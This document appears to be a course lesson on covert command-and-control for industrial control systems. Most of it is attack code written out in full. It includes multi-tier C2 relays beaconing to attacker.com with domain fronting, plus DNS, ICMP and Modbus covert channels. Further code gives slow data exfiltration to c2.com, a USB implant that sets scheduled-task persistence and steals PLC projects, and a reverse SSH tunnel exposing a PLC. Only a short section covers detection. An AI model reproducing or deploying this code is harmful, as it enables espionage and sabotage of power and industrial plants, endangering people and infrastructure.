Lesson 09: Command and Control
(C2) for ICS

Lesson 09: Command and Control (C2)
for ICS Environments
Learning Objectives
●​
●​
●​
●​
●​
●​
●​

Design resilient C2 infrastructure for air-gapped and semi-isolated OT networks
Implement protocol-aware C2 channels that blend with legitimate industrial traffic
Develop slow and low tradecraft for long-term covert operations
Bypass network segmentation and air-gap isolation
Analyze real-world ICS C2 strategies (Industroyer, Triton, Stuxnet)
Implement multi-tier C2 architectures with redundant channels
Understand operational security (OPSEC) for nation-state level operations

1. C2 Challenges in OT Environments
1.1 Unique Constraints
Air-Gap Isolation:
●​
●​
●​
●​

No direct internet connectivity (Level 0-2 of Purdue Model)
Must bridge via compromised IT/OT gateway or removable media
Limited outbound communication channels
Network address translation (NAT) prevents direct PLC access from internet

Network Monitoring:
●​
●​
●​
●​

Deep packet inspection (DPI) on OT traffic
Baseline-based anomaly detection (new connections trigger alerts)
Protocol whitelisting (only known industrial protocols allowed)
Strict firewall rules (deny-by-default)

Operational Constraints:
●​
●​
●​
●​

Low bandwidth (serial connections, slow networks)
High-latency environments (satellite links to remote sites)
Strict change management (new processes/connections reviewed)
Minimal endpoint security (no EDR, limited AV)

OPSEC Requirements:
●​
●​
●​
●​

Multi-year dwell time (slow operations)
Attribution avoidance (nation-state operations)
Minimize forensic footprint
Blend with normal operations

1.2 C2 Objectives in ICS
1.​ Reconnaissance: Monitor industrial processes, collect intelligence
2.​ Command Execution: Deploy payloads, modify PLC logic
3.​ Data Exfiltration: Steal IP (process recipes, engineering drawings)
4.​ Maintaining Access: Persist across incidents and maintenance
5.​ Coordinated Attack: Synchronize multi-site operations

2. C2 Architecture for ICS
2.1 Multi-Tier C2 Infrastructure
┌────────────────────────────────────────────────────────
─────┐
│ Internet (Attacker Infrastructure)
│
│ ┌──────────┐ ┌──────────┐ ┌──────────┐
│
│ │ Primary │────│ Backup │────│ Emergency│
│
│ │ C2 Server│ │ C2 Server│ │ C2 (Dead │
│
│ └──────────┘ └──────────┘ │ Drop) │
│
└──────────────────────────────────┴──────────┴──────────
────┘
│
│
│
[Firewall / DMZ / VPN Gateway]
│
│
│
┌────────────────────────────────────────────────────────
──────┐
│ Corporate IT Network (Level 4-5)
│
│ ┌────────────┐
│
│ │ Tier 1 │ Compromised IT workstation
│
│ │ Jump Box │ - Initial foothold
│
│ └────────────┘ - Bridges to OT network
│
└───────────────────────────┬────────────────────────────
──────┘
│
[IT/OT Firewall]
│
┌───────────────────────────┴────────────────────────────
──────┐
│ OT DMZ / Level 3 (Monitoring & Engineering)
│
│ ┌──────────────┐ ┌──────────────┐
│
│ │ Tier 2
│ │ Tier 2
│
│
│ │ Engineering │ │ SCADA
│
│
│ │ Workstation │ │ Server
│
│
│ └──────────────┘ └──────────────┘
│
└───────────────────────────┬────────────────────────────
──────┘
│

[OT Firewall]
│
┌───────────────────────────┴────────────────────────────
──────┐
│ Process Control Network (Level 0-2)
│
│ ┌──────────┐ ┌──────────┐ ┌──────────┐
│
│ │ Tier 3 │ │ Tier 3 │ │ Tier 3 │
│
│ │ HMI
│ │ PLC #1 │ │ PLC #2 │
│
│ └──────────┘ └──────────┘ └──────────┘
│
└────────────────────────────────────────────────────────
──────┘

2.2 Implementing Multi-Tier C2
# multi_tier_c2.py - Cascading C2 architecture for OT
import socket
import base64
import time
import json
class MultiTierC2:
def __init__(self, tier_level, next_hop=None):
self.tier = tier_level
self.next_hop = next_hop # IP of next tier
self.command_queue = []
def tier1_it_workstation(self):
"""
Tier 1: Corporate IT network
- Internet-connected
- Relays commands to OT network
"""
c2_server = "attacker.com"
while True:
# Beacon to external C2 (HTTPS)
commands = self.https_beacon(c2_server)
if commands:
# Forward to Tier 2 (OT DMZ) via allowed protocol
self.forward_to_tier2(commands)
# Slow beacon (every 6 hours)
time.sleep(21600)
def https_beacon(self, c2_url):
"""
HTTPS beacon with domain fronting

Disguise as legitimate web traffic
"""
import requests
# Domain fronting: Use CDN to hide real C2
headers = {
'Host': 'attacker.com', # Real C2
'User-Agent': 'Mozilla/5.0...' # Legitimate browser UA
}
try:
response = requests.get(
'https://cloudflare.com/update', # CDN domain
headers=headers,
timeout=30
)
if response.status_code == 200:
# Commands encoded in response
commands = base64.b64decode(response.text)
return json.loads(commands)
except:
pass
return None
def forward_to_tier2(self, commands):
"""
Forward commands to Tier 2 (Engineering workstation in OT DMZ)
Use protocol allowed through IT/OT firewall (e.g., RDP, SSH)
"""
# Connect to EWS via allowed remote desktop protocol
ews_ip = self.next_hop # Engineering workstation
ews_port = 3389 # RDP
# Encode commands in RDP clipboard transfer
# Or use SSH tunnel if SSH is allowed
self.ssh_forward(ews_ip, commands)
def ssh_forward(self, target_ip, data):
"""
Forward data via SSH (if allowed through firewall)
"""
import paramiko
ssh = paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(target_ip, username='engineer', password='password')
# Execute command on Tier 2
stdin, stdout, stderr = ssh.exec_command(f'python3 tier2_agent.py
"{base64.b64encode(json.dumps(data).encode()).decode()}"')
ssh.close()
def tier2_ot_dmz(self):
"""
Tier 2: OT DMZ (Engineering workstation or SCADA server)
- Cannot reach internet directly
- Relays to process control network
"""
while True:
# Receive commands from Tier 1
commands = self.check_tier1_commands()
if commands:
# Forward to PLCs via Modbus/S7/EtherNet/IP
self.forward_to_plcs(commands)
time.sleep(3600) # Check hourly
def forward_to_plcs(self, commands):
"""
Forward commands to Tier 3 (PLCs)
Use native industrial protocols
"""
for plc in commands.get('target_plcs', []):
if plc['protocol'] == 'modbus':
self.modbus_c2_execute(plc['ip'], commands['action'])
elif plc['protocol'] == 's7':
self.s7_c2_execute(plc['ip'], commands['action'])
def modbus_c2_execute(self, plc_ip, action):
"""
Execute command via Modbus covert channel
"""
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient(plc_ip, port=502)
client.connect()
# Encode command in Modbus register (covert channel)
# Register 1000: Command opcode
# Register 1001-1010: Parameters

if action['type'] == 'read_program':
# Trigger PLC firmware backdoor to dump program
client.write_register(1000, 0x01) # Command: READ_PROGRAM
time.sleep(2)
program_data = client.read_holding_registers(1100, 100) # Response registers
elif action['type'] == 'modify_output':
# Force output state
client.write_register(1000, 0x02) # Command: MODIFY_OUTPUT
client.write_register(1001, action['output_id'])
client.write_register(1002, action['new_state'])
client.close()
# Usage - Deploy agents at each tier
tier1 = MultiTierC2(tier_level=1, next_hop="192.168.100.10") # IT workstation
tier1.tier1_it_workstation()

3. Covert C2 Channels
3.1 DNS Tunneling
# dns_c2_channel.py - DNS tunneling for air-gapped networks
import dns.resolver
import base64
import binascii
class DNSC2:
def __init__(self, domain="c2.attacker.com"):
self.domain = domain
self.resolver = dns.resolver.Resolver()
def send_command(self, cmd_string):
"""
Encode command in DNS query subdomain
Example: base64cmd.c2.attacker.com
"""
# Encode command
encoded = base64.b32encode(cmd_string.encode()).decode().replace('=', '')
# Split into DNS labels (max 63 chars each)
labels = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
# Construct query
query = '.'.join(labels) + f".{self.domain}"

# Send DNS query
try:
answers = self.resolver.resolve(query, 'A')
# Command acknowledged (dummy response)
return True
except:
return False
def receive_response(self, query_id):
"""
Receive response via DNS TXT record
Attacker updates TXT record with encoded response
"""
query = f"{query_id}.response.{self.domain}"
try:
answers = self.resolver.resolve(query, 'TXT')
for rdata in answers:
# Decode TXT record
response_b32 = str(rdata).strip('"')
response = base64.b32decode(response_b32 + '===')
return response.decode()
except:
return None
def exfiltrate_data(self, data, chunk_size=200):
"""
Exfiltrate data via DNS queries
Very slow but bypasses firewall
"""
# Split data into chunks
chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
for i, chunk in enumerate(chunks):
encoded = base64.b32encode(chunk).decode().replace('=', '')
query = f"{i}.{encoded[:63]}.exfil.{self.domain}"
# Send chunk
self.resolver.resolve(query, 'A')
time.sleep(60) # Slow exfiltration (1 chunk/minute)
# Usage
dns_c2 = DNSC2("c2domain.com")
dns_c2.send_command("read_plc_program")
response = dns_c2.receive_response("12345")

3.2 Protocol-Native C2 (Modbus)

# modbus_native_c2.py - C2 using Modbus protocol
from pymodbus.client import ModbusTcpClient
import struct
import time
class ModbusC2:
def __init__(self, plc_ip, command_register=1000, response_register=1100):
self.client = ModbusTcpClient(plc_ip, port=502)
self.client.connect()
self.cmd_reg = command_register
self.resp_reg = response_register
def send_command(self, opcode, params=[]):
"""
Send command via Modbus registers
Appears as normal SCADA write operations
"""
# Write opcode
self.client.write_register(self.cmd_reg, opcode)
# Write parameters
for i, param in enumerate(params):
self.client.write_register(self.cmd_reg + 1 + i, param)
print(f"[+] Command {opcode} sent via Modbus")
def read_response(self, length=10):
"""
Read response from PLC
PLC firmware backdoor writes results to response registers
"""
result = self.client.read_holding_registers(self.resp_reg, length)
if not result.isError():
return result.registers
return None
def execute_plc_command(self, command):
"""
High-level command execution
"""
commands = {
'dump_program': (0x01, []),
'modify_output': (0x02, [command.get('output_id', 0), command.get('state', 0)]),
'read_memory': (0x03, [command.get('address', 0), command.get('length', 10)]),
'backdoor_status': (0xFF, [])
}

if command['type'] in commands:
opcode, params = commands[command['type']]
self.send_command(opcode, params)
time.sleep(2) # Wait for PLC to process
response = self.read_response()
return response
def beacon_loop(self, interval=3600):
"""
Periodic beacon to check for new commands
Blends with normal SCADA polling
"""
while True:
# Check for pending commands (opcode 0xFF = status check)
self.send_command(0xFF, [])
response = self.read_response(1)
if response and response[0] > 0:
# New command available
print("[+] New command detected")
# Read and execute command
cmd_data = self.read_response(10)
self.process_command(cmd_data)
time.sleep(interval) # Slow beacon (every hour)
# Usage
modbus_c2 = ModbusC2("192.168.10.10")
modbus_c2.execute_plc_command({'type': 'dump_program'})
modbus_c2.beacon_loop(3600)

3.3 ICMP Tunneling
# icmp_c2_tunnel.py - C2 over ICMP (ping)
# ICMP often allowed through OT firewalls for diagnostics
from scapy.all import *
import base64
class ICMPC2:
def __init__(self, target_ip):
self.target = target_ip
def send_command(self, command):
"""

Encode command in ICMP payload
"""
# Encode command
encoded_cmd = base64.b64encode(command.encode())
# Craft ICMP packet with command in payload
packet = IP(dst=self.target) / ICMP(type=8, code=0) / Raw(load=encoded_cmd)
# Send packet
send(packet, verbose=0)
print(f"[+] Command sent via ICMP to {self.target}")
def receive_response(self):
"""
Sniff for ICMP replies with encoded response
"""
def packet_callback(pkt):
if pkt.haslayer(ICMP) and pkt[ICMP].type == 0: # Echo Reply
if pkt.haslayer(Raw):
# Decode response
response = base64.b64decode(pkt[Raw].load)
print(f"[+] Response: {response.decode()}")
return response
# Sniff for replies
sniff(filter=f"icmp and src {self.target}", prn=packet_callback, count=1, timeout=10)
# Usage
icmp_c2 = ICMPC2("192.168.10.10")
icmp_c2.send_command("read_sensors")
icmp_c2.receive_response()

3.4 HTTP(S) via Vendor Portals
# vendor_portal_c2.py - Disguise C2 as vendor support traffic
import requests
import time
class VendorPortalC2:
def __init__(self, vendor_domain="support.siemens.com"):
self.vendor_domain = vendor_domain
self.session = requests.Session()
def beacon(self, device_id):
"""
Beacon disguised as legitimate update check
"""

# Appear as Siemens TIA Portal checking for updates
headers = {
'User-Agent': 'Siemens TIA Portal V17 Update Service',
'X-Device-ID': device_id,
'X-Product-Version': '17.0.0.1'
}
# Real Siemens update servers mixed with attacker C2
update_urls = [
f"https://{self.vendor_domain}/api/updates/check", # Legitimate
f"https://cdn.{self.vendor_domain}/updates/manifest.json", # Attacker-controlled
CDN
]
for url in update_urls:
response = self.session.get(url, headers=headers, timeout=30)
if response.status_code == 200 and 'command' in response.json():
# Attacker server returned command
return response.json()['command']
time.sleep(5) # Slow requests to appear normal
return None
def exfiltrate_via_update_feedback(self, data):
"""
Exfiltrate data disguised as update installation feedback
"""
feedback_url = f"https://{self.vendor_domain}/api/feedback"
# Encode stolen data in "error report"
feedback = {
'status': 'error', # Fake error to justify large data
'error_code': 'E_UPDATE_FAILED',
'diagnostic_data': base64.b64encode(data).decode(),
'timestamp': time.time()
}
self.session.post(feedback_url, json=feedback)
print("[+] Data exfiltrated via vendor feedback channel")
# Usage
vendor_c2 = VendorPortalC2("update.siemens.com")
command = vendor_c2.beacon("PLC-12345")
if command:
print(f"[+] Received command: {command}")

4. Slow and Low Tradecraft
4.1 Beacon Strategy
# slow_beacon.py - Slow beacon for long-term operations
import time
import random
class SlowBeacon:
def __init__(self, c2_url, base_interval=86400):
self.c2_url = c2_url
self.base_interval = base_interval # 24 hours
def calculate_next_beacon(self):
"""
Calculate next beacon time with jitter
Mimic human work patterns
"""
# Business hours only (8 AM - 6 PM local time)
import datetime
now = datetime.datetime.now()
# Add jitter (±20% of base interval)
jitter = random.randint(-int(self.base_interval * 0.2),
int(self.base_interval * 0.2))
next_beacon = now + datetime.timedelta(seconds=self.base_interval + jitter)
# Ensure beacon during business hours
while next_beacon.hour < 8 or next_beacon.hour > 18:
next_beacon += datetime.timedelta(hours=1)
# Skip weekends
while next_beacon.weekday() >= 5: # Saturday/Sunday
next_beacon += datetime.timedelta(days=1)
return next_beacon
def beacon_loop(self):
"""
Slow beacon with human-like patterns
"""
while True:
# Beacon to C2
commands = self.beacon()
if commands:
self.execute_commands(commands)

# Calculate next beacon time
next_beacon = self.calculate_next_beacon()
sleep_seconds = (next_beacon - datetime.datetime.now()).total_seconds()
print(f"[*] Next beacon: {next_beacon} ({sleep_seconds/3600:.1f} hours)")
time.sleep(sleep_seconds)
def beacon(self):
"""
Send beacon (implementation depends on C2 channel)
"""
# Example: HTTPS beacon
try:
response = requests.get(self.c2_url, timeout=30)
if response.status_code == 200:
return response.json()
except:
pass
return None
# Usage - Beacon once per day during business hours
slow_c2 = SlowBeacon("https://c2.com/beacon", base_interval=86400)
slow_c2.beacon_loop()

4.2 Data Exfiltration Rate Limiting
# rate_limited_exfil.py - Slow exfiltration to avoid detection
import time
import hashlib
class RateLimitedExfiltration:
def __init__(self, max_bytes_per_day=10240): # 10 KB/day
self.daily_limit = max_bytes_per_day
self.bytes_sent_today = 0
self.last_reset = time.time()
def exfiltrate_file(self, file_path, c2_url):
"""
Exfiltrate file at very slow rate
"""
with open(file_path, 'rb') as f:
data = f.read()
# Calculate chunks
chunk_size = 1024 # 1 KB chunks
chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

print(f"[*] Exfiltrating {len(data)} bytes in {len(chunks)} chunks")
print(f"[*] Estimated time: {len(chunks) / 10:.1f} days")
for i, chunk in enumerate(chunks):
# Check daily limit
if self.bytes_sent_today >= self.daily_limit:
# Wait until tomorrow
sleep_time = 86400 - (time.time() - self.last_reset)
print(f"[*] Daily limit reached, sleeping for {sleep_time/3600:.1f} hours")
time.sleep(sleep_time)
self.bytes_sent_today = 0
self.last_reset = time.time()
# Send chunk
self.send_chunk(chunk, i, c2_url)
self.bytes_sent_today += len(chunk)
# Delay between chunks (randomized)
time.sleep(random.randint(3600, 7200)) # 1-2 hours
def send_chunk(self, data, chunk_id, c2_url):
"""
Send single chunk to C2
"""
import requests
payload = {
'chunk_id': chunk_id,
'data': base64.b64encode(data).decode(),
'checksum': hashlib.md5(data).hexdigest()
}
requests.post(c2_url, json=payload, timeout=30)
print(f"[+] Chunk {chunk_id} sent ({len(data)} bytes)")
# Usage - Exfiltrate 1MB file over ~100 days
exfil = RateLimitedExfiltration(max_bytes_per_day=10240)
exfil.exfiltrate_file("/path/to/plc_program.bin", "https://c2.com/upload")

5. Air-Gap Bridging Techniques
5.1 USB Drop Campaign
# usb_airgap_bridge.py - Automated air-gap bridging via USB
# Deploy on Rubber Ducky or similar USB attack device
class USBAirGapBridge:

def __init__(self):
self.staging_area = "E:\\staged_data" # USB drive
self.target_path = "C:\\Users\\Engineer\\Documents"
def deploy_agent(self):
"""
When USB plugged into air-gapped EWS, deploy agent
"""
import shutil
import subprocess
# Copy agent to target system
agent_source = f"{self.staging_area}\\system_update.exe"
agent_dest = f"{self.target_path}\\system_update.exe"
shutil.copy(agent_source, agent_dest)
# Establish persistence
subprocess.call(f'schtasks /create /tn "SystemUpdate" /tr "{agent_dest}" /sc daily /st
02:00')
print("[+] Agent deployed on air-gapped system")
def collect_data(self):
"""
Collect data from air-gapped network to USB
Next time USB is connected to internet-connected system, exfiltrate
"""
import os
import zipfile
# Locate valuable data
plc_projects = self.find_plc_projects()
scada_configs = self.find_scada_configs()
# Zip and copy to USB
with zipfile.ZipFile(f"{self.staging_area}\\collected_data.zip", 'w') as zf:
for file in plc_projects + scada_configs:
zf.write(file, os.path.basename(file))
print(f"[+] Collected {len(plc_projects) + len(scada_configs)} files to USB")
def find_plc_projects(self):
"""
Locate PLC project files
"""
import glob

project_patterns = [
"C:\\Users\\*\\Documents\\Siemens\\*.ap17", # TIA Portal
"C:\\Users\\*\\Documents\\Rockwell\\*.ACD", # RSLogix 5000
"C:\\Users\\*\\Documents\\Schneider\\*.STU" # Unity Pro
]
files = []
for pattern in project_patterns:
files.extend(glob.glob(pattern))
return files
def bridge_to_internet(self):
"""
When USB plugged into internet-connected system, exfiltrate
"""
import requests
collected_data = f"{self.staging_area}\\collected_data.zip"
if os.path.exists(collected_data):
with open(collected_data, 'rb') as f:
files = {'file': f}
requests.post("https://c2.com/upload", files=files)
print("[+] Data exfiltrated via USB bridge")
# Delete evidence
os.remove(collected_data)
# Deployment:
# 1. Leave infected USB drives near target facility
# 2. Engineer finds USB, plugs into air-gapped EWS
# 3. Agent deploys and collects data
# 4. Engineer later plugs USB into IT laptop
# 5. Data automatically exfiltrated

5.2 Compromised Vendor Laptop
# vendor_laptop_bridge.py - Infect system integrator laptops
# When vendor connects to customer OT network, establish C2
class VendorLaptopBridge:
def __init__(self):
self.customer_networks = []
def detect_ot_network_connection(self):
"""

Detect when laptop is connected to customer OT network
Look for industrial protocols on network
"""
import socket
import nmap
nm = nmap.PortScanner()
# Scan local subnet for Modbus/S7/EtherNet/IP
local_subnet = self.get_local_subnet()
nm.scan(hosts=local_subnet, arguments='-p 502,102,44818 -sT')
ot_devices = []
for host in nm.all_hosts():
if nm[host]['tcp'].get(502, {}).get('state') == 'open': # Modbus
ot_devices.append({'ip': host, 'protocol': 'modbus'})
elif nm[host]['tcp'].get(102, {}).get('state') == 'open': # S7
ot_devices.append({'ip': host, 'protocol': 's7'})
if ot_devices:
print(f"[+] Connected to OT network with {len(ot_devices)} devices")
self.establish_c2_bridge(ot_devices)
def establish_c2_bridge(self, ot_devices):
"""
Establish C2 tunnel from vendor laptop to OT network
Laptop has both OT and internet connectivity
"""
import subprocess
# Set up reverse SSH tunnel from laptop to C2 server
# Allows C2 server to access OT network through laptop
ssh_tunnel_cmd = 'ssh -f -N -R 9999:192.168.10.10:502 attacker@c2server.com'
subprocess.call(ssh_tunnel_cmd, shell=True)
print("[+] C2 tunnel established")
print("[*] Attacker can now access PLC 192.168.10.10 via C2 server port 9999")
# Notify C2 server
self.notify_c2(ot_devices)
def notify_c2(self, ot_devices):
"""
Notify C2 server of new OT network access
"""
import requests

data = {
'vendor_id': 'laptop_12345',
'customer': self.identify_customer(),
'ot_devices': ot_devices,
'tunnel_port': 9999
}
requests.post("https://c2.com/new_ot_access", json=data)
# Deploy on system integrator laptops
# When they connect to customer sites, automatic C2 bridge established

6. Real-World C2 Case Studies
6.1 Stuxnet C2 Strategy
Multi-Stage C2:
1.​ Stage 1: USB worm spreads in corporate IT network
2.​ Stage 2: Identify Step 7 machines (engineering workstations)
3.​ Stage 3: Infect PLCs via legitimate engineering software
4.​ Stage 4: P2P C2 within facility (no external beaconing)
5.​ Stage 5: Update mechanism via infected USB drives brought onsite
No Traditional C2: Stuxnet operated entirely autonomously after initial deployment. Updates
delivered via USB.

6.2 Industroyer C2 Architecture
# industroyer_c2_reconstruction.py
"""
Industroyer (2016 Ukraine blackout) C2:
1. Initial access via spear-phishing (corporate IT)
2. Lateral movement to OT engineering workstation
3. Deploy backdoor (44con) with custom protocol
4. C2 protocol: HTTP(S) to legitimate-looking domains
5. Timed activation (synchronized multi-site blackout)
6. Data wiper to cover tracks
"""
class IndustroyerC2:
def __init__(self, c2_domains):
self.c2_domains = c2_domains # Multiple domains for redundancy
self.current_domain = 0
def beacon(self):
"""

Beacon to C2 servers with failover
"""
import requests
for domain in self.c2_domains:
try:
response = requests.get(f"https://{domain}/api/status", timeout=30)
if response.status_code == 200:
return response.json()
except:
continue # Try next domain
return None
def execute_coordinated_attack(self, target_time):
"""
Wait for specific time, then execute attack
Allows multi-site coordinated blackout
"""
import datetime
while datetime.datetime.now() < target_time:
time.sleep(3600) # Check hourly
# Execute attack
self.open_all_breakers()
self.wipe_evidence()
# Industroyer used time-based activation for coordinated attacks

7. Defensive Detection
7.1 Detecting C2 Traffic
# detect_ot_c2.py - Network monitoring for C2 indicators
class OTC2Detector:
def __init__(self):
self.baseline_connections = {}
def analyze_network_traffic(self, pcap_file):
"""
Analyze OT network traffic for C2 indicators
"""
from scapy.all import rdpcap, IP, TCP, UDP, DNS
packets = rdpcap(pcap_file)

anomalies = []
for pkt in packets:
# Detect DNS tunneling
if pkt.haslayer(DNS) and pkt[DNS].qd:
query = pkt[DNS].qd.qname.decode()
if len(query) > 100: # Abnormally long DNS query
anomalies.append(f"DNS tunneling: {query}")
# Detect outbound connections from OT network
if pkt.haslayer(IP):
src_ip = pkt[IP].src
dst_ip = pkt[IP].dst
if self.is_ot_ip(src_ip) and not self.is_internal_ip(dst_ip):
anomalies.append(f"Outbound connection: {src_ip} -> {dst_ip}")
# Detect beaconing (regular intervals)
if pkt.haslayer(TCP):
self.check_beaconing_pattern(pkt)
return anomalies
def detect_modbus_covert_channel(self, pcap_file):
"""
Detect abnormal Modbus register access patterns
"""
from scapy.all import rdpcap
packets = rdpcap(pcap_file)
register_access = {}
for pkt in packets:
if self.is_modbus_packet(pkt):
register = self.extract_register_address(pkt)
# Track access frequency
register_access[register] = register_access.get(register, 0) + 1
# Flag high-numbered registers (uncommon)
suspicious = {reg: count for reg, count in register_access.items() if reg > 500}
return suspicious
# Usage
detector = OTC2Detector()
anomalies = detector.analyze_network_traffic("ot_traffic.pcap")

for anomaly in anomalies:
print(f"[!] Anomaly: {anomaly}")

8. Hands-On Lab Exercises
Lab 1: Multi-Tier C2 Infrastructure
Objective: Build cascading C2 across network boundaries
Setup:
●​ Tier 1: Kali Linux (internet-connected)
●​ Tier 2: Windows server (simulated OT DMZ)
●​ Tier 3: OpenPLC (simulated process control network)
Tasks:
1.​ Deploy C2 agents at each tier
2.​ Implement command relay through firewalls
3.​ Execute PLC commands from internet-connected C2
4.​ Measure latency and detection risk

Lab 2: DNS Tunneling C2
Objective: Implement DNS-based C2 channel
Tasks:
1.​ Set up DNS server for C2 domain
2.​ Implement DNS tunneling client (encode commands in queries)
3.​ Test command execution via DNS
4.​ Exfiltrate file via DNS (measure bandwidth)
5.​ Attempt detection with Wireshark/Zeek

Lab 3: Modbus Covert Channel
Objective: Implement C2 using Modbus protocol
Implementation:
1.​ Set up Modbus PLC simulator
2.​ Implement command encoding in Modbus registers
3.​ Create beacon loop using Modbus polling
4.​ Demonstrate traffic blends with normal SCADA
5.​ Test defensive detection techniques

Lab 4: Slow Beacon Tradecraft

Objective: Implement long-term operational OPSEC
Tasks:
1.​ Deploy slow beacon (24-hour interval)
2.​ Add jitter and business-hours restriction
3.​ Implement data exfiltration rate limiting (10 KB/day)
4.​ Simulate multi-month operation
5.​ Analyze forensic footprint

9. Tools & Resources
C2 Frameworks
●​
●​
●​
●​

Cobalt Strike: Commercial C2 (malleable profiles)
Metasploit: Open-source framework
Empire/Covenant: PowerShell/.NET C2
Sliver: Modern Go-based C2

Tunneling Tools
●​
●​
●​
●​

iodine: DNS tunneling
dnscat2: DNS C2 channel
reGeorg: HTTP tunnel
Chisel: Fast TCP/UDP tunnel

OT-Specific
●​ Modbus: pymodbus library
●​ S7: python-snap7
●​ ICS-PCAP: Sample ICS traffic for testing

Summary
C2 in ICS environments requires specialized techniques:
Key Principles:
●​
●​
●​
●​
●​

Multi-tier architecture (bridge air-gaps)
Protocol-native channels (Modbus, S7, DNS)
Slow and low tradecraft (long-term operations)
Redundant channels (primary, backup, emergency)
Operational security (mimic normal traffic)

Challenges:
●​ Air-gap isolation

●​ Network monitoring and baselines
●​ Limited bandwidth
●​ Strict change management
Techniques:
●​
●​
●​
●​
●​

DNS/ICMP tunneling
Vendor portal disguise
USB-based bridging
Compromised vendor laptops
Time-based activation

Real-World Examples:
●​ Stuxnet: Autonomous operation via USB
●​ Industroyer: HTTP(S) C2 with time synchronization
●​ Triton: Local operations, minimal external C2

